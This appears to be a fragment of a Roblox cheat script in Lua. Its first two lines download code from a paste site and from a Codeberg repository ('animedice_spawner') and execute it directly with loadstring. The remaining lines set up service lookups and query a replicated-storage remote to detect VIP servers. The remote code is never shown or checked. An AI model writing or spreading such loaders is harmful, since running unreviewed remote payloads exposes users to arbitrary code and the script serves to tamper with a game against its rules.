loadstring(game:HttpGet("https://cdn.sourceb.in/bins/8kWNFIoYue/0"))()
loadstring(game:HttpGet("https://codeberg.org/elysiummm/whatthehelly/raw/branch/main/visual/animedice_spawner"))()
local Services = setmetatable({}, {
    __index = function(self, s)
        return game:GetService(s)
    end
})

local IsVipServer = false
pcall(function()
    local rs = Services.RobloxReplicatedStorage
    if rs and rs:FindFirstChild("GetServerType") then
        IsVipServer = rs.GetServerType:InvokeServer() == "VIPServer"
    end
end)
